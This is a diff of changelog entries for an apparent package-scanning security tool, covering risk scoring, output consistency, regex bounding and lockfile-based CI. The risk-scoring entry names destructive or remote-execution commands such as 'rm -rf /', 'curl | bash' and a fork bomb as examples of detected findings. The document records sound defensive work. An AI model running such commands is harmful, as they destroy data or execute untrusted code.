+      function of a short string. Memoised with a bounded cache, because the
+      keys are attacker-controlled and an unbounded memo is memory the
+      attacker sizes.
+    - Three modules (`buildfetch`, `sabotage`, `crossfire`) each carried their
+      own char-by-char copy of the same stripper, which accounted for most of
+      1.77 million list appends in one scan. All three now use the shared
+      memoised one.
+    - `registry_resolutions` ran **three times per analysis** - once for the
+      coverage gap, once for the IOC surface, once for the R143 composition -
+      re-joining every line and re-classifying every function each time. Now
+      cached, also bounded.
+    - `unicode.py` walked all **1,114,112 code points** at import asking
+      `unicodedata` for each category, about 360 ms, paid by every CLI
+      invocation including `--version`, because `cli.inspect` imports from it
+      at module level. The scan is deferred to first use rather than replaced
+      by a literal: deriving it is what makes a format-control codepoint added
+      in a future Unicode version covered automatically, and only *when* it
+      runs has changed.
+
+  Measured on an 875 KB diff: 27.25s -> 18.81s. Scaling stays linear. Routine
+  operations were swept and none exceeds 26 ms: config load 2.7 ms, rule load
+  0.7 ms, fingerprint 2.5 ms, database init 15.2 ms, a typical package scan
+  25.4 ms.
+
+- **A CRITICAL finding floors the band at `High`.** CRITICAL weighs 40 and the
+  High band opens at 51, so arithmetic alone could never lift a *single*
+  CRITICAL above `Medium`: a lone fork bomb, a lone `rm -rf /` and a lone
+  `curl | bash` all total 40, and `curl | bash` only read High because it
+  happens to trip three rules at once. One confirmed CRITICAL finding is not a
+  medium situation whatever the sum says.
+
+  No score changes - the floor moves the band only - so the calibrated
+  separation between the benign and malicious score populations is untouched
+  (benign p95 35, malicious p5 60). Severity overriding arithmetic is the shape
+  B4 already establishes, where a FATAL caps the score at 100 regardless of the
+  total. Enforced by `a critical finding never reads medium`.
+
+- **A FATAL finding names itself in `risk_label`.** A FATAL caps the score at
+  100, so it arrives as `Critical` - and so does a score that merely
+  accumulated past 80. Those are different claims: a FATAL rule is
+  unsuppressible by construction and the shipped ones target the *reviewer*
+  rather than the machine. `risk_label` now reads `Critical (FATAL: R013)`.
+
+  It rides the label rather than a new band deliberately. `risk` is a closed
+  enum consumers gate on, and nothing is lost without a new member: the
+  severity is in `score_breakdown` either way. Naming the FATAL does not
+  displace B2's coverage qualifier, which the gate asserts. Enforced by
+  `a fatal finding names itself in the label`.
+
+- **Three sabotage fixtures were mislabelled as whole attacks.** The
+  separation gate excludes single-signal probes by reading their declared
+  `min_score` against `CRITICAL_MIN_SCORE` (40), and `S001`-`S003` declared
+  exactly 40 - asserting a High-or-worse outcome for fixtures that are
+  one-rule probes scoring `Medium`. They were the first fixtures to land
+  exactly on that boundary; every existing CRITICAL probe scores above it by
+  tripping more than one rule. Relabelled to `min_score: 30`, which is still
+  true and correctly classifies them, restoring malicious p5 from 50 to 60.
+
+- **The API and the CLI now emit the same JSON body (B11).** There were three
+  machine-readable surfaces building three different dicts: `review --json`
+  (14 keys), `inspect --json` (14 different keys) and the API's `to_dict()`
+  (31 keys), with two naming conventions between them (`package` against
+  `package_name`, `score` against `final_score`). The API body carried no
+  `findings` at all while its docstring claimed to be what the CLI writes, so
+  a consumer written against one path could silently miss evidence on
+  another. All three now render through `reporting.report_body`, and every key
+  in `reporting.REPORT_KEYS` is present on all of them with the same value.
+
+- **Three fields were missing from terminal renders that the JSON carried.**
+  Found by pushing one fact through all seven output methods and comparing,
+  rather than by comparing JSON with JSON. Each of the three had a gate
+  already, and each gate was aimed at the layer where the value is set rather
+  than at the renders that have to show it:
+
+    - `trustsight inspect` reported **nothing** about a coverage gap unless
+      `--score` or `--risk` was passed. The gap rode the band label, and the
+      default output correctly withholds the band, so the one light that must
+      never be suppressible was suppressed by default on that command (B2).
+      Both `inspect` renders now show it independently of any band.
+    - `trustsight review` showed **suppressed rules only in its JSON body** -
+      neither the Rich nor the plain render mentioned them, so an
+      override-silenced rule looked, on screen, exactly like one that never
+      matched (B5).
+    - `trustsight inspect` without Rich had **no change summary**, so that
+      terminal could not tell "nothing fired and nothing changed" from
+      "nothing fired and a great deal changed" (B7).
+
+  Enforced by the new `every render reports the same information` gate, which
+  loops over all four renderers.
+
+- **`review`'s plain renderer is now `_render_results_plain`.** It was inline
+  in `_run_analysis_loop` and could not be called without a CLI invocation,
+  which is why two of the three omissions above lived there:
+  `contributing/security-review.md` says an ungateable path is where the
+  dropped field will be, and it was.
+
+- **A fork-bomb pattern was bounded before it shipped.** Two unbounded lazy
+  spans plus a backreference in `S001` is a catastrophic-backtracking shape,
+  and A5's 8 KiB clamp still leaves 8 KiB to backtrack across: it cost 2.4
+  seconds on one hostile line and failed the `rule matching is bounded on
+  hostile input` gate. Every span in the sabotage module now carries a
+  constant ceiling, which brought the same line to 20 ms and the whole
+  family's cost to within noise of the pre-existing baseline.
+
+- **`inspect --json` no longer volunteers the score.** It always emitted
+  `score`, `risk` and `risk_label` regardless of the flags, so the number the
+  CLI is documented to withhold was the default for every machine consumer of
+  that command. The score group is now withheld on every surface unless asked
+  for: `--score`/`--risk` on the CLI, `include_score=True` on the API.
+  Per-finding `weight` moved to the verbose `score_breakdown`, since a weight
+  is score arithmetic. Attribute access is unchanged - `report.score` is
+  always populated, because naming the field is the request.
+
+  **Breaking for consumers of `Report.to_dict()`**, which now returns the
+  CLI's report body rather than the serialised `PackageFact`. The stored
+  record is available as `Report.raw`, in its own storage naming.
+
+- **`display._fact_to_dict` is gone.** It was `inspect --json`'s private body
+  builder; with that path on the shared one it had no callers, and the
+  `every JSON report carries the fingerprint` gate was still aimed at it -
+  a gate passing against a function no JSON path calls, which is the same
+  failure mode in a new place. The gate now exercises `report_body` (with and
+  without the score) and the stored `fact_json` beside it.
+
+
+- **CI installs from the lock.** Every workflow used `pip install -e ".[dev]"`,
+  resolving five runtime dependencies fresh from PyPI on every push - a live
+  remote dependency inside the job that certifies the security model, and the
+  softest edge of the stated "CI is not compromised" assumption. Workflows now
+  use `uv sync --locked`, which resolves nothing and installs exactly the
+  pinned, hashed versions in `uv.lock`. Enforced by the new `CI installs from
+  the lock` gate. `astral-sh/setup-uv` is pinned by commit SHA like every
+  other action.
+
+  The flag is `--locked` and not `--frozen` deliberately. Both install from
+  the lock and resolve nothing, but `--frozen` performs no check that the
+  lock still matches `pyproject.toml`: a dependency added to the manifest and
+  never locked is silently ignored, and the job installs an older closure
+  while appearing to honour the manifest. `--locked` fails instead, which is
+  what makes the lock load-bearing rather than merely present.
+
+- **`uv.lock` was stale.** It recorded the project at 0.11.0, two releases
+  behind, so nothing could have installed `--frozen` from it. Refreshed; the
+  dependency set was already correct and did not change.
+
+- **`cryptography` now has a floor (`>=42.0`).** It had no lower bound at all,
+  despite being the module that verifies the signatures A13 and A13b rest on.
+
+### Added
+
+- **A `supply-chain` workflow**: exports the locked closure, generates a
+  CycloneDX SBOM, and reports known advisories against it, weekly and on
+  dependency changes. Deliberately **non-blocking**. Making it a gate would
+  put a remote advisory feed in the path of every push, which is what every
+  other workflow's `--frozen` install exists to remove, and an advisory is
+  evidence about a library rather than a verdict about this program. The
+  "dependencies are trusted" assumption stands; what changes is that the
+  project can now see when it stops holding.
+
+- **[Sandboxing the tokenizer](explanation/sandboxing-the-tokenizer.md)**, a
+  design note on the larger of the two architectural limits. It argues the
+  tokenizer is the component worth isolating and the renderer is not, states
+  what isolation would *not* buy (it bounds the blast radius of a defect, not
+  the correctness of expansion), and records three conditions under which it
+  should be built. Nothing is scheduled; the point is that the current
+  position is a choice with its reasoning written down.
+
 ## [0.13.1] - 2026-08-12
 
 ### Fixed
